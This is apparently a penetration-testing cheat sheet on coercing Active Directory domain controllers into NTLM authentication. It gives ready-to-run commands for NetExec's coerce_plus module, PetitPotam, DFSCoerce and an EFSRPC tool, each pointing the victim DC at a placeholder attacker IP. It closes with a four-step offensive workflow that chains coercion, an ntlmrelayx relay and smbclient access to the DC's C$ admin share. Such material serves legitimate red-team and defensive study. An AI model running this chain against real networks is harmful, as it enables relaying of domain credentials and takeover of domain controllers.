**Coercion** techniques in Active Directory refer to methods where one system can be induced to authenticate to another system, such as forcing a domain controller to authenticate to an external machine.


---

## Revision with Netexec

The `coerce_plus` module of **Netexec** inspects Active Directory objects for configurations that could unintentionally allow one machine or service to trigger authentication from another. 

```bash
nxc ldap <target> -u <user> -p <password> -M coerce_plus
```

- Detects potential coercion paths (RPC, legacy permissions).
- Useful to identify where you can trigger forced authentication flows.


---

## PetitPotam

Forces a target (often a Domain Controller) to perform NTLM authentication to your attacker machine via **MS‑EFSRPC**.

```bash
python3 PetitPotam.py -d <domain> -u <user> -p <password> <attacker_ip> <target_dc_ip>
```

- `<attacker_ip>` → your machine where you capture/relay NTLM.
- `<target_dc_ip>` → victim DC coerced into authenticating.

---

## DFSCoerce

Abuses **DFS Namespace Management RPC** to coerce authentication.

```bash
python3 dfscoerce.py -u <user> -p <password> -d <domain> <attacker_ip> <target_dc_ip>
```

- Forces DFS RPC calls that trigger machine‑to‑machine authentication.
- Can be combined with NTLM relay attacks.

---

## MS‑EFSRPC / “mseve”

Another coercion vector via **Encrypting File System Remote Protocol**.

```bash
python3 mseve.py -u <user> -p <password> -d <domain> <attacker_ip> <target_dc_ip>
```

- Exploits legacy EFSRPC calls to induce authentication.
- Similar in concept to PetitPotam but different RPC path.


---

# Offensive Workflow Example

1. **Enumerate coercion paths**

```bash
nxc ldap <dc_ip> -u <user> -p <password> -M coerce_plus
```

2. **Trigger coercion (PetitPotam)**

```bash
python3 PetitPotam.py -d <domain> -u <user> -p <password> <attacker_ip> <target_dc_ip>
```

3. **Relay captured NTLM to escalate**

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

4. **Access privileged resources**

```bash
smbclient -U <domain>/<user> //<target_dc_ip>/C$
```

